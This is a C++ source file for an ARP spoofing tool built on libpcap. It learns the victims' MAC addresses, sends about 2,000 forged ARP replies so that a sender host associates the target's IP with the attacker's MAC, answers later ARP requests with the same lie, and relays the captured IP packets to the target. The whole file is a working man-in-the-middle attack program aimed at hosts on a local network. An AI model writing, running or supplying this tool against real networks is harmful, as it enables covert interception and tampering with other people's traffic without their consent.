#include <arpa/inet.h>
#include <list>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <thread>
#include <unistd.h>

using namespace std;

void get_attacker_info(char* dev, char* mac, char* ip);
void get_mac_from_ip(pcap_t* handle, char* self_mac, char* self_ip, char* target_mac, char* target_ip);

class Session {
private:
    pcap_t* handle;
    char dev[16];
    char sender_ip[4];
    char target_ip[4];
    char attacker_ip[4];
    char sender_mac[6];
    char target_mac[6];
    char attacker_mac[6];

public:
    void init_handle_dev(pcap_t* _handle, char* _dev);
    void init_ip(char* _sender_ip, char* _target_ip, char* _attacker_ip);
    void init_mac(char* _attacker_mac);
    void arp_storm();
    void relay_packet();
    void reply_arp_request();
    void keep_arp_request();
};

void Session::init_handle_dev(pcap_t* _handle, char* _dev)
{
    handle = _handle;
    memcpy(dev, _dev, strlen(_dev) + 1);
}

void Session::init_ip(char* _sender_ip, char* _target_ip, char* _attacker_ip)
{
    memcpy(sender_ip, _sender_ip, 4);
    memcpy(target_ip, _target_ip, 4);
    memcpy(attacker_ip, _attacker_ip, 4);
    printf("Finished Init IP!\n");
}

void Session::init_mac(char* _attacker_mac)
{
    memcpy(attacker_mac, _attacker_mac, 6);
    get_mac_from_ip(handle, attacker_mac, attacker_ip, sender_mac, sender_ip);
    get_mac_from_ip(handle, attacker_mac, attacker_ip, target_mac, target_ip);
}

void Session::arp_storm()
{
    printf("Performing ARP Storm for 10 seconds...\n");

    u_char packet[100];
    struct ethhdr* eth_hdr;
    struct ether_arp* arp_hdr;

    eth_hdr = (struct ethhdr*)packet;
    memcpy(eth_hdr->h_dest, sender_mac, 6);
    memcpy(eth_hdr->h_source, attacker_mac, 6);
    eth_hdr->h_proto = htons(ETHERTYPE_ARP);

    arp_hdr = (struct ether_arp*)(packet + 14);
    arp_hdr->arp_hrd = htons(ARPHRD_ETHER);
    arp_hdr->arp_pro = htons(ETHERTYPE_IP);
    arp_hdr->arp_hln = 0x06;
    arp_hdr->arp_pln = 0x04;
    arp_hdr->arp_op = htons(0x0002);
    memcpy(arp_hdr->arp_sha, attacker_mac, 6);
    memcpy(arp_hdr->arp_tha, sender_mac, 6);
    memcpy(arp_hdr->arp_spa, target_ip, 4);
    memcpy(arp_hdr->arp_tpa, sender_ip, 4);

    for (int i = 0; i < 2000; i++) {
        if (pcap_sendpacket(handle, packet, sizeof(struct ethhdr) + sizeof(struct ether_arp)) != 0) {
            printf("Error in ARP Storm!\n");
            return;
        }
        usleep(5000);
    }
}

void Session::relay_packet()
{
    printf("Performing Packet Relay...\n");

    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {
        if (res == 0)
            continue;

        struct ethhdr* eth_hdr;

        eth_hdr = (struct ethhdr*)packet;

        if (ntohs(eth_hdr->h_proto) == ETHERTYPE_IP && !memcmp(eth_hdr->h_dest, attacker_mac, 6) && !memcmp(eth_hdr->h_source, sender_mac, 5)) {
            struct ip* ip_hdr;
            ip_hdr = (struct ip*)(packet + 14);

            if (!memcmp(&((ip_hdr->ip_src).s_addr), sender_ip, 4)) {
                printf("IP Packet Captured! Relaying...\n");
                memcpy(eth_hdr->h_source, attacker_mac, 6);
                memcpy(eth_hdr->h_dest, target_mac, 6);
                if (pcap_sendpacket(handle, packet, header->len) != 0) {
                    printf("Error Relaying Packet!\n");
                    return;
                }
            }
        }
    }
}

void Session::reply_arp_request()
{
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {
        if (res == 0)
            continue;

        struct ethhdr* eth_hdr;

        eth_hdr = (struct ethhdr*)packet;

        if (ntohs(eth_hdr->h_proto) == ETHERTYPE_ARP && !memcmp(eth_hdr->h_source, sender_mac, 6)) {
            struct ether_arp* arp_hdr;
            arp_hdr = (struct ether_arp*)(packet + 14);
            if (ntohs(arp_hdr->arp_op) == 0x0001) {
                u_char packet[100];
                struct ethhdr* eth_hdr;
                struct ether_arp* arp_hdr;

                eth_hdr = (struct ethhdr*)packet;
                memcpy(eth_hdr->h_dest, sender_mac, 6);
                memcpy(eth_hdr->h_source, attacker_mac, 6);
                eth_hdr->h_proto = htons(ETHERTYPE_ARP);

                arp_hdr = (struct ether_arp*)(packet + 14);
                arp_hdr->arp_hrd = htons(ARPHRD_ETHER);
                arp_hdr->arp_pro = htons(ETHERTYPE_IP);
                arp_hdr->arp_hln = 0x06;
                arp_hdr->arp_pln = 0x04;
                arp_hdr->arp_op = htons(0x0002);
                memcpy(arp_hdr->arp_sha, attacker_mac, 6);
                memcpy(arp_hdr->arp_tha, sender_mac, 6);
                memcpy(arp_hdr->arp_spa, target_ip, 4);
                memcpy(arp_hdr->arp_tpa, sender_ip, 4);
                if (pcap_sendpacket(handle, packet, sizeof(struct ethhdr) + sizeof(struct ether_arp)) != 0) {
                    printf("Error in Replying ARP!\n");
                    return;
                }
            }
        }
    }
}

void Session::keep_arp_request()
{
    return;
}

int main(int argc, char* argv[])
{
    pcap_t* handle;
    char dev[16];
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "";
    bpf_u_int32 mask;
    bpf_u_int32 net;
    char attacker_ip[4], attacker_mac[6];
    list<Session> session;
    list<Session>::iterator sessioni;

    if (argc < 4) {
        printf("Usage: %s <interface> <sender ip> <target ip> [<sender ip> <target ip>]", argv[0]);
        return (0);
    }

    memcpy(dev, argv[1], strlen(argv[1]) + 1);

    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return (2);
    }

    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return (2);
    }

    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return (2);
    }

    get_attacker_info(dev, attacker_mac, attacker_ip);

    for (int i = 0; i < (argc - 2) / 2; i++) {
        Session ts;
        char sender_ip[4], target_ip[4];
        inet_pton(AF_INET, argv[i * 2 + 2], sender_ip);
        inet_pton(AF_INET, argv[i * 2 + 3], target_ip);
        ts.init_handle_dev(handle, dev);
        ts.init_ip(sender_ip, target_ip, attacker_ip);
        ts.init_mac(attacker_mac);
        session.push_back(ts);
    }

    for(sessioni = session.begin(); sessioni != session.end(); ++sessioni) {
        thread t(&Session::arp_storm, *sessioni);

        t.join();
    }

    for(sessioni = session.begin(); sessioni != session.end(); ++sessioni) {
        thread t1(&Session::relay_packet, *sessioni);
        thread t2(&Session::reply_arp_request, *sessioni);
        thread t3(&Session::keep_arp_request, *sessioni);

        t1.join();
        t2.join();
        t3.join();
    }
}

void get_attacker_info(char* dev, char* mac, char* ip)
{
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (!ioctl(fd, SIOCGIFHWADDR, &ifr))
        memcpy(mac, (char*)ifr.ifr_hwaddr.sa_data, 6);

    if (!ioctl(fd, SIOCGIFADDR, &ifr))
        memcpy(ip, (char*)&(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr), 4);

    close(fd);

    return;
}

void get_mac_from_ip(pcap_t* handle, char* self_mac, char* self_ip, char* target_mac, char* target_ip)
{
    u_char packet[100];
    struct ethhdr* eth_hdr;
    struct ether_arp* arp_hdr;

    printf("Fetching MAC Address of %s...\n", inet_ntoa(*(struct in_addr*)target_ip));

    eth_hdr = (struct ethhdr*)packet;
    memset(eth_hdr->h_dest, -1, 6);
    memcpy(eth_hdr->h_source, self_mac, 6);
    eth_hdr->h_proto = htons(ETHERTYPE_ARP);

    arp_hdr = (struct ether_arp*)(packet + 14);
    arp_hdr->arp_hrd = htons(ARPHRD_ETHER);
    arp_hdr->arp_pro = htons(ETHERTYPE_IP);
    arp_hdr->arp_hln = 0x06;
    arp_hdr->arp_pln = 0x04;
    arp_hdr->arp_op = htons(0x0001);
    memcpy(arp_hdr->arp_sha, self_mac, 6);
    memset(arp_hdr->arp_tha, 0x00, 6);
    memcpy(arp_hdr->arp_spa, self_ip, 4);
    memcpy(arp_hdr->arp_tpa, target_ip, 4);

    while (1) {
        if (pcap_sendpacket(handle, packet, sizeof(struct ethhdr) + sizeof(struct ether_arp)) != 0) {
            printf("Error in Fetching MAC!\n");
            return;
        }

        printf("ARP Request Packet Sent to %s...\n", inet_ntoa(*(struct in_addr*)target_ip));

        struct pcap_pkthdr* header;
        const u_char* _packet;
        int res;

        while ((res = pcap_next_ex(handle, &header, &_packet)) >= 0) {
            if (res == 0)
                continue;

            struct ethhdr* _eth_hdr;

            _eth_hdr = (struct ethhdr*)_packet;

            if (ntohs(_eth_hdr->h_proto) == ETHERTYPE_ARP) {
                struct ether_arp* _arp_hdr;
                _arp_hdr = (struct ether_arp*)(_packet + 14);

                if (ntohs(_arp_hdr->arp_op) == 0x0002) {
                    if (!memcmp(_arp_hdr->arp_spa, target_ip, 4)) {
                        memcpy(target_mac, _arp_hdr->arp_sha, 6);
                        printf("ARP Reply Packet Received from %s...\n", inet_ntoa(*(struct in_addr*)target_ip));
                        printf("MAC Address of %s: %s\n", inet_ntoa(*(struct in_addr*)target_ip), ether_ntoa((struct ether_addr*)target_mac));
                        return;
                    }
                }
            }
            printf("Retrying Fetching MAC...\n");
            break;
        }
    }
}
